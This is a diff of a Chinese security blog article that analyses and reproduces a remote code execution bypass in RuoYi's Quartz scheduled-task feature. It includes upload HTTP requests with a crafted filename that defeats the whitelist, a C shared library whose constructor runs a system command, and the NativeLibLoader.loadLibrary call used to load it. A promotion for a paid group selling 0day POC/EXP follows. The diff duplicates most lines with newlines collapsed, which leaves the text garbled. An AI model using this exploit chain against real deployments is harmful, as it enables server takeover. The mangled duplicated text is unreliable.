+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNOqMQ3JepRcoicwhLXS47GpcUc7zrs9Lu4icnicforWAm9MgacwjbLfib5A/640?wx_fmt=png&from=appmsg "")  
 ```
-/**  
- * 执行方法  
- *  
- * @param sysJob 系统任务  
- */  
-public static void invokeMethod(SysJob sysJob) throws Exception  
-{  
-    String invokeTarget = sysJob.getInvokeTarget();  
-    String beanName = getBeanName(invokeTarget);  
-    String methodName = getMethodName(invokeTarget);  
-    List<Object[]> methodParams = getMethodParams(invokeTarget);  
-
-    if (!isValidClassName(beanName))  
-    {  
-        Object bean = SpringUtils.getBean(beanName);  
-        invokeMethod(bean, methodName, methodParams);  
-    }  
-    else  
-    {  
-        Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();  
-        invokeMethod(bean, methodName, methodParams);  
-    }  
-}
+/**   * 执行方法   *   * @param sysJob 系统任务   */  public static void invokeMethod(SysJob sysJob) throws Exception  {      String invokeTarget = sysJob.getInvokeTarget();      String beanName = getBeanName(invokeTarget);      String methodName = getMethodName(invokeTarget);      List<Object[]> methodParams = getMethodParams(invokeTarget);      if (!isValidClassName(beanName))      {          Object bean = SpringUtils.getBean(beanName);          invokeMethod(bean, methodName, methodParams);      }      else      {          Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();          invokeMethod(bean, methodName, methodParams);      }  }
 ```  
   
 传递的参数只能是其中的这些类型 通过 , 进⾏分割。substringBetween获取的是() ⾥⾯ 不能继续包含 )了会截断  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVcQBnVU3dEBSZXkW7OS3xWke8iakhuXiavVhR2YiarKOplE9pyHdBtkxQw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNZCZ4KZnM6CADju5lphbs5XzyOLvXibCjpdRC0kCEOXgspnVlTDh1wmQ/640?wx_fmt=png&from=appmsg "")  
 ```
-public static String substringBetween(final String str, final String open, final String close) {  
-    if (!ObjectUtils.allNotNull(str, open, close)) {  
-        return null;  
-    }  
-    final int start = str.indexOf(open);  
-    if (start != INDEX_NOT_FOUND) {  
-        final int end = str.indexOf(close, start + open.length());  
-        if (end != INDEX_NOT_FOUND) {  
-            return str.substring(start + open.length(), end);  
-        }  
-    }  
-    return null;  
-}
+public static String substringBetween(final String str, final String open, final String close) {      if (!ObjectUtils.allNotNull(str, open, close)) {          return null;      }      final int start = str.indexOf(open);      if (start != INDEX_NOT_FOUND) {          final int end = str.indexOf(close, start + open.length());          if (end != INDEX_NOT_FOUND) {              return str.substring(start + open.length(), end);          }      }      return null;  }
 ```  
   
 那我们可以直接去找String 可控到sink 的类就可以了。  
   
 这⾥反射的时候还需要注意 需要满⾜ 存在⼀个参构造 且都是public的  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVKlS752lOtwZ03Byrt0OpN3ppu7DhtOQ6ZiawSicoRu6AlhbD2SdOBamA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNxPjFRC22RFdAibicArJj43F9JkBTiacZjWVASEEJ2yHLAhTYUTiaxjyB7Q/640?wx_fmt=png&from=appmsg "")  
 ```
 Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();
 ```  
 #### 计划任务分析  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVYX2aLFAaHxy6yesDxPbqeGicC0Pmb1T9dz9d6NOSQk6SE8zG9K9Ooeg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNyfPtknQyaQJ7pPqNLQ8v6XpvQfcJ3SHMoKCibicUJVeQXSRr5TZwN2kw/640?wx_fmt=png&from=appmsg "")  
   
 根据提交数据包锁定后端路由  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVOMtNaDmVQSVnZiaFRtzyINJsKvOP0C5g9plofc6NibyFibFFM6EU3rFaw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNxxlLzudiaGWuiaIo6RWLia9hyWYt30ekicPCiaS3V5ndVu3Le9zfAubbt7Q/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVjnFlMnib3xr8TJtKhlvmh1l7sYJoZtNxgNZB4cLBFm0vsnj8FllGsbA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN22XfXiajj8uRZKmGV6LcGib99Kdbg0YusHwicZOfYXmKLqjYn9HibTwyrw/640?wx_fmt=png&from=appmsg "")  
   
   
 调试看一下具体做了什么  
   
 前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVVT8zxWK5n6CCkaibODXBGFG12CDTnMOy1GZtZatqr9GMRs1z31GuFeA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNyEBmJLrf5RicTjZJkkpj23LcVFAdY9VYrXFQicde8dPGHY3ibeTMnN9Bg/640?wx_fmt=png&from=appmsg "")  
   
   
 还判断了是否有一些黑名单中的类  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVXvT1gUzS7XzqmibEoycFezz190La3IZCcR6gicCvubnrDNe6icmM8YFHw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNeaJHEMQic2qYr4tACVDYEc2UicjqvBJAGX5An8jIuGkV12QETDFKwasQ/640?wx_fmt=png&from=appmsg "")  
   
   
 进入白名单的判断  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVWbEefMz3ibcPHyYmGwCjm50Gl61n4D4rlkwx7C3bibF0FS9pmOiamzfmQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNs4hdmKKjs48Kib9kajZu7s2jNqBGPbpKKqu8fricuNEIkX1WJib6qS4wA/640?wx_fmt=png&from=appmsg "")  
   
   
 提取出调用的类名，判断其中是否包含白名单字符串  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVtIpjuX9ogTS5BqKIMa5ibq3H5khFxQOiaa1qz8kemQo1iaj1Az6rkwyibg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1UoSqtaDT1yicmRcphwOs70bnzOe9pjdmXBgXh5pKMPe57ibicy0PhIEw/640?wx_fmt=png&from=appmsg "")  
   
 白名单字符串为com.ruoyi.quartz.task  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV3Hmgq3e6HNoibOazP4JvzzTVicBcfQW1EBV4C2oW7UVE6B5WLROQbuNg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN6GxDMsjhCHwPa58ibL2jj78f47CcuM0QqIjGHYmibDjSib2ibnVzDibYCJQ/640?wx_fmt=png&from=appmsg "")  
   
 注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV5QBWuelTdeSTehwyAg0rBaSibnwG3LibR3EIjNbp9AEVndXic4sGbU5lQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHjalAd76ibfS0gO3rdOf5XDmd3BPj4qU1c9eElbpf7VUZvUZWQ6q6Dw/640?wx_fmt=png&from=appmsg "")  
   
   
 后续就会进入正常的j保存计划任务流程  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVrthicrC41iaAxtPvNxiaLEGibqQaibQJsY6bxh8fnIfNRJwAHO0OZqLZ8Cg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNtggs7fiaTcFyicMvpjEib4k4V0iaTssbtuckxOnQAmSNMcFYLZyRdRzPnw/640?wx_fmt=png&from=appmsg "")  
   
   
 当启动任务时，会调用方法  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVeZmZFCibS62sUUQ30t6W5JnCHB20ezpaRbvMO68F6Dyia1fVA9c2Q4ng/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHFVVQKysJ0UPx4serTw2kdkIIqInicVhibbFZnThjPh4U4OuUqgx9Obg/640?wx_fmt=png&from=appmsg "")  
   
 获取需要调用的类名方法名参数值  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVe1bWO8wJzQv12icyxFMxTRicdaBnq3Lm53oPosUnWbicla0Xiah7VibymYQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNIwSW3E1VVaYUGVInxeu1RBBOg8o2saB8PtsE5hBJB1xOj1Ve2ic5wGg/640?wx_fmt=png&from=appmsg "")  
   
 在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVEZjPIEEkwyTiaNU2YOKAy7CpvVyeYe1En4B5ep9zW6Xwl8jgPiaL0Njg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN0kUjtoViaQkto0tUpGibIgeg8Gq6OPaic7n1Rc3uVpz7Af0spY7Av6xgg/640?wx_fmt=png&from=appmsg "")  
   
 接着会实例化该类，反射调用其方法  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVj6gb7t8UaDcll2ufeibg2YdZxiaCCw86zBFFPxomGBXMYrmWzuDp9grw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNKJVicITamPrK6QCJlxegVfrUOkxibkyUMfcBOEFN73hialhyO9M5QzAGA/640?wx_fmt=png&from=appmsg "")  
   
 该方法为public修饰  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVff6CRMQdyWJYoQz9xP13A8Bp6r3eg2y2cEqLTtMhm0o2lrkWOBufEA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNPcXkfXXaH9iaNfJ2QibLmWiaKh5gNQMq0xXyMRicUu4YuywvBM7SrMAfOw/640?wx_fmt=png&from=appmsg "")  
   
 我们想要利用需要达成的是  
 - 使用的类不在黑名单中  
@@ -876,91 +762,177 @@ Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();
   
 而在ruoyi中存在一个文件上传点  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVbic19IiboH3icc1TVKCDbkQGnO2ry0Jh9wH1Yo9vLiakb5SBFcra6NJRKQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN3Rkzam1picdz4bAekm77h8IAgWQSgNXAbMh9EOWFQPOd4EP3ACSquog/640?wx_fmt=png&from=appmsg "")  
   
 我们可以随便上传一个文件看看  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVQNKyibNQNqARNenxkzlZExAFwcvkyr7gwZicL0NmxibdcCfWFQT2BFzjw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNfP1SqDdR0FuhWLGQtSFibf1vVYTdJJ4Rnv7oCSrwicJicGeicHzIqqcJ8g/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVbypwfW3Qibf1XvLghDwnu6rgkTenrHEj98k3pj33xFUATOvB7N2fIHw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNfaPh8jyPNdvXs0OlaTWYgEiagmnIghIWJ6sz0qnaicA2BVGEJBqEsSsA/640?wx_fmt=png&from=appmsg "")  
   
   
 那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV7RdKATvOvygFdsiaJJWbP9A8ByPLHMJgWIlwRaJFbTWaIRVHlVR0I0w/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNziaTvLzVe3r9GASjAIdTusnHzXn6fcdUS76LwVQV523r5Qh09wrfQjA/640?wx_fmt=png&from=appmsg "")  
 ## 漏洞复现  
   
 在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的<font style="color:rgba(0, 0, 0, 0.85);">构造函数</font>  
   
 而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVx4e2QLenyymVpljMeiaiaC1OrObdagYa7rpjHkicJ7UxrgSkewV3nsPqQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNx6xibPnYv5gNuIQYIpfa0lhyNPz2qZibfhEp3EmNgD7wEd8e5qA86qkQ/640?wx_fmt=png&from=appmsg "")  
 ```
-POST /common/upload HTTP/1.1
-Host: 10.40.107.67
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
-x-forwarded-for: 127.0.0.1
-Connection: close
-Content-Type: multipart/form-data; boundary=00content0boundary00
-Content-Length: 167
-
---00content0boundary00
-Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"
-Content-Type: image/jpg
-
-success
---00content0boundary00--
+POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpgsuccess--00content0boundary00--
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVXzssLPEBMpJn1SAibKLN0yjEE6Sm3WAqicYxOD11giaYqfJ2hN7QlO9Vg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1mxRV0pclCzVc9Gs74nV2RIX1V3dftT16CAPkqRkMjg1X2FHuibD8uw/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVEHeP83AaxqWVruLibTO41oTqXeWhEyoUnKIaKpGV6aQ61xS3NZibDtpw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNV8fheDH0decXiaeWr1KgmowSnoulial3xpB4J39iaaFFytoF6UTqTBiaBQ/640?wx_fmt=png&from=appmsg "")  
 ```
-cat calc.c 
-
-#include <stdlib.h>
-__attribute__((constructor))
-static void run() {
-system("open -a Calculator");
-}
+cat calc.c #include <stdlib.h>__attribute__((constructor))static void run() {system("open -a Calculator");}
 ```  
 ```
-POST /common/upload HTTP/1.1
-Host: 10.40.107.67
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
-x-forwarded-for: 127.0.0.1
-Connection: close
-Content-Type: multipart/form-data; boundary=00content0boundary00
-Content-Length: 167
-
---00content0boundary00
-Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"
-Content-Type: image/jpg
-
-二进制恶意代码
---00content0boundary00--
+POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpg二进制恶意代码--00content0boundary00--
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVd9jFoq9aZicibIKcHpQNsvC00vUXPib5WHlKbeEadD4mKnYNImCjS8bvw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4Tic45Cxck2hibzUIyKYoleYC7sGibtmV3ibBF3VibpXvMRz9xWaOe71tibA/640?wx_fmt=png&from=appmsg "")  
   
   
 注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
+#   
+#   
   
   
-关注我获取更多......  
+![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
+  
+**内部圈子详情介绍**  
+  
+我们是  
+神农安全  
+，点赞 + 在看  
+ 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
+  
+  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
+  
+**内部圈子介绍**  
+  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
+  
+  
+  
+**圈子专注于更新src/红蓝攻防相关：**  
+  
+```
+1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
+2、知识星球专属微信“小圈子交流群”
+3、微信小群一起挖洞
+4、内部团队专属EDUSRC证书站漏洞报告
+5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
+6、分享src挖掘技巧tips
+7、不定期有众测、渗透测试项目（一起挣钱）
+8、不定期有工作招聘内推（工作/护网内推）
+9、送全国职业技能大赛环境+WP解析（比赛拿奖）
+```  
   
   
   
   
+**内部圈子**  
+**专栏介绍**  
+  
+知识星球内部共享资料截屏详情如下  
+  
+（只要没有特殊情况，每天都保持更新）  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+**知识星球——**  
+**神农安全**  
+  
+星球现价   
+￥45元  
+  
+如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
+  
+星球人数少于800人 45元/年  
+  
+星球人数少于1000人 60元/年  
+  
+（新人优惠卷20，扫码或者私信我即可领取）  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUQrFWcBesgFeibmAaLTXbl25YKcjTuT0F7X8qBLgI7JaOjU1DxsgxfyicbBDibicKwvIhjia1Jm33NQaA/640?wx_fmt=png&from=appmsg "")  
+  
+欢迎加入星球一起交流，券后价仅45元！！！ 即将满800人涨价  
+  
+长期  
+更新，更多的0day/1day漏洞POC/EXP  
+  
+  
+  
+**内部知识库--**  
+**（持续更新中）**  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
+  
+  
+**知识库部分大纲目录如下：**  
+  
+知识库跟  
+知识星球联动，基本上每天保持  
+更新，满足圈友的需求  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+知识库和知识星球有师傅们关注的  
+EDUSRC  
+和  
+CNVD相关内容（内部资料）  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+还有网上流出来的各种  
+SRC/CTF等课程视频  
+  
+量大管饱，扫描下面的知识星球二维码加入即可  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+  
+  
+内部小圈子——  
+圈友反馈  
+（  
+良心价格  
+）  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
+  
+  
+****  
+**神农安全公开交流群**  
+  
+有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXzIXhsuibSCxH9DL0qbmoy9fgFDcSWC6Yyg3eJsoE70q5jJ1OiaSQYcFsw/640?wx_fmt=jpeg&from=appmsg "")  
+  
+****  
+    
+```
+```  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
   
   
